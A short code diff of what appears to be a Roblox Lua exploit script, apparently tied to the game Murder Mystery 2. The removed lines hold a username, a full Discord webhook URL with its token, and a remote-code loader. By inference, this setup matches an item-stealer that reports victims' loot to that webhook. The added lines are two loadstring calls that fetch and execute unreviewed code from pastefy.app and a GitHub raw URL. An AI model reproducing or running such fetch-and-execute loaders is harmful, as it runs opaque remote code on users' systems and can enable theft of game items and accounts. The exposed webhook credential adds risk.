@@ -1,6 +1,2 @@
-Username = "pablogarote"
-Webhook = "https://discordapp.com/api/webhooks/1370725747827671122/cYQ4z6GU7xj0IJBbd_T9n1hHdciFXMcljuGZ0e4y-Qb4odttpVLVjTWkLa6_uIv9HYny"
-
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/urekshesh/Protected_MM2/refs/heads/main/MM2"))()
+loadstring(game:HttpGet("https://pastefy.app/uO7gpxLa/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/urekshesh/odh/refs/heads/main/asdsdadf"))()
